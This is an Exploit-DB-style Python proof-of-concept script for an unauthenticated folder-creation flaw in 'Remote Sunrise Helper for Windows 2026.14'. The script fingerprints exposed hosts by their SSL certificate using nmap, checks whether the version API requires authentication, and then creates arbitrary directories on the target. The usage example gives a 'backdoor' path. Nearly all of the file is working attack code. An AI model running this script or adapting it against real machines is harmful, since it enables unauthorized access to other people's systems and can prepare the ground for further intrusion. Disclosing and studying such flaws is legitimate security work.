#!/usr/bin/env python3
# Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated Directory Creation
# Date: 2026-04-20
# Exploit Author: Chokri Hammedi
# Software: https://rs.ltd/latest.php?os=win
# Vendor: https://rs.ltd/
# Version: 2026.14
# Tested on: Windows 10 / Windows 11
#
# Identification:
# nmap -p- -T4 <target> --script ssl-cert
# Look for SSL cert with subject: CN=SecureHTTPServer/O=Evgeny Cherpak/C=US

import requests, json, sys, urllib3
urllib3.disable_warnings()

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <target_ip> <api_port> <path>")
    print(f"Example: {sys.argv[0]} 192.168.1.103 49737 'C:/Users/Public/backdoor'")
    print(f"Example: {sys.argv[0]} 192.168.1.103 49737 '%USERPROFILE%/Desktop/newfolder'")
    sys.exit(1)

target = sys.argv[1]
api_port = sys.argv[2]
path = sys.argv[3]
url = f"https://{target}:{api_port}"
headers = {"X-HostName": "a", "X-ClientToken": "a", "X-HostFullModel": "a"}

try:
    r = requests.get(f"{url}/api/getVersion", verify=False, timeout=5)
    data = r.json()
    
    if data.get("requires.auth") == False:
        print(f"[+] VULNERABLE - {target}")
        print(f"    Host: {data.get('host.name')} | OS: {data.get('win.version')}")
        
        r = requests.get(f"{url}/api/createFolder={path}", headers=headers, verify=False)
        
        if r.status_code == 200:
            print(f"[+] Created folder: {path}")
        else:
            print(f"[-] Create failed")
    else:
        print(f"[*] Not vulnerable - authentication required")
        
except Exception as e:
    print(f"[-] Error: {e}")
